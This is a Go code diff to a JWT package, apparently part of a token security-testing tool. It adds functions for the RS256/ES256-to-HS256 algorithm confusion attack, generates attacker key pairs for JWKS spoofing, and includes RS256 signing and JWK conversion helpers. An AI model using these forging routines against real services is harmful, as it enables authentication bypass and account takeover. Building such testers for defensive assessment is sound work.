@@ -11,10 +11,19 @@
 package jwt
 
 import (
+	"crypto/ecdsa"
+	"crypto/elliptic"
 	"crypto/hmac"
+	"crypto/rand"
+	"crypto/rsa"
 	"crypto/sha256"
+	"crypto/x509"
 	"encoding/base64"
 	"encoding/json"
+	"encoding/pem"
+	"errors"
+	"fmt"
+	"math/big"
 	"sort"
 	"strings"
 )
@@ -23,6 +32,10 @@ import (
 func b64url(b []byte) string {
 	return base64.RawURLEncoding.EncodeToString(b)
 }
+
+// B64URL is the exported form for use by mutators that need to compute
+// signatures to compare against captured token signatures.
+func B64URL(b []byte) string { return b64url(b) }
 
 // b64urlDecode is the inverse, lenient about padding presence.
 func b64urlDecode(s string) ([]byte, error) {
@@ -97,6 +110,129 @@ func SignHS256(encodedHeader, encodedClaims, secret string) string {
 	h := hmac.New(sha256.New, []byte(secret))
 	h.Write([]byte(encodedHeader + "." + encodedClaims))
 	return b64url(h.Sum(nil))
+}
+
+// AlgConfusionFromPEM implements the RS256/ES256→HS256 algorithm confusion
+// attack: parse the PEM-encoded public key and use its raw DER bytes as the
+// HMAC-SHA256 secret to re-sign the header+claims. The header alg is set to
+// HS256. Returns an error when the PEM does not contain a recognised public key.
+func AlgConfusionFromPEM(header, claims map[string]any, pemBytes string) (string, error) {
+	secret, err := pemToRawBytes(pemBytes)
+	if err != nil {
+		return "", fmt.Errorf("alg-confusion: %w", err)
+	}
+	h := copyMapAny(header)
+	h["alg"] = "HS256"
+	return EncodeWithHS256(h, claims, string(secret))
+}
+
+// pemToRawBytes extracts the raw DER bytes from a PEM block. Supports
+// RSA and EC public keys (PKIX and traditional PKCS1/SEC1 forms).
+func pemToRawBytes(pemStr string) ([]byte, error) {
+	block, _ := pem.Decode([]byte(pemStr))
+	if block == nil {
+		return nil, errors.New("no PEM block found")
+	}
+	return block.Bytes, nil
+}
+
+// GenerateAttackerKeyPair generates an ephemeral RSA-2048 key pair for the
+// JWKS-spoof attack. Returns (privateKey, publicKey, error).
+func GenerateAttackerKeyPair() (*rsa.PrivateKey, *rsa.PublicKey, error) {
+	priv, err := rsa.GenerateKey(rand.Reader, 2048)
+	if err != nil {
+		return nil, nil, err
+	}
+	return priv, &priv.PublicKey, nil
+}
+
+// SignRS256 produces the base64url-encoded RS256 (RSASSA-PKCS1-v1_5 SHA-256)
+// signature over encodedHeader+"."+encodedClaims.
+func SignRS256(encodedHeader, encodedClaims string, priv *rsa.PrivateKey) (string, error) {
+	h := sha256.New()
+	h.Write([]byte(encodedHeader + "." + encodedClaims))
+	digest := h.Sum(nil)
+	sig, err := rsa.SignPKCS1v15(rand.Reader, priv, 5, digest) // 5 = crypto.SHA256
+	if err != nil {
+		return "", err
+	}
+	return b64url(sig), nil
+}
+
+// EncodeWithRS256 assembles a JWT signed with RS256 using priv.
+func EncodeWithRS256(header, claims map[string]any, priv *rsa.PrivateKey) (string, error) {
+	h := copyMapAny(header)
+	h["alg"] = "RS256"
+	if _, ok := h["typ"]; !ok {
+		h["typ"] = "JWT"
+	}
+	hb, err := marshalSorted(h)
+	if err != nil {
+		return "", err
+	}
+	cb, err := marshalSorted(claims)
+	if err != nil {
+		return "", err
+	}
+	eh := b64url(hb)
+	ec := b64url(cb)
+	sig, err := SignRS256(eh, ec, priv)
+	if err != nil {
+		return "", err
+	}
+	return eh + "." + ec + "." + sig, nil
+}
+
+// PublicKeyToJWK converts an RSA public key to a minimal JWK map.
+func PublicKeyToJWK(pub *rsa.PublicKey, kid string) map[string]any {
+	return map[string]any{
+		"kty": "RSA",
+		"alg": "RS256",
+		"use": "sig",
+		"kid": kid,
+		"n":   b64url(pub.N.Bytes()),
+		"e":   b64url(big.NewInt(int64(pub.E)).Bytes()),
+	}
+}
+
+// GenerateAttackerECKeyPair generates an ephemeral EC P-256 key pair.
+func GenerateAttackerECKeyPair() (*ecdsa.PrivateKey, *ecdsa.PublicKey, error) {
+	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
+	if err != nil {
+		return nil, nil, err
+	}
+	return priv, &priv.PublicKey, nil
+}
+
+// PublicKeyToJWKEC converts an EC public key to a minimal JWK map.
+func PublicKeyToJWKEC(pub *ecdsa.PublicKey, kid string) map[string]any {
+	return map[string]any{
+		"kty": "EC",
+		"alg": "ES256",
+		"use": "sig",
+		"crv": "P-256",
+		"kid": kid,
+		"x":   b64url(pub.X.Bytes()),
+		"y":   b64url(pub.Y.Bytes()),
+	}
+}
+
+// EncodePKIX encodes a public key to PKIX PEM form.
+func EncodePKIX(pub any) (string, error) {
+	der, err := x509.MarshalPKIXPublicKey(pub)
+	if err != nil {
+		return "", err
+	}
+	block := &pem.Block{Type: "PUBLIC KEY", Bytes: der}
+	return string(pem.EncodeToMemory(block)), nil
+}
+
+func copyMapAny(m map[string]any) map[string]any {
+	out := make(map[string]any, len(m))
+	for k, v := range m {
+		out[k] = v
+	}
+	return out
 }
 
 // EncodeWithHS256 is the convenience path: build header+claims, sign
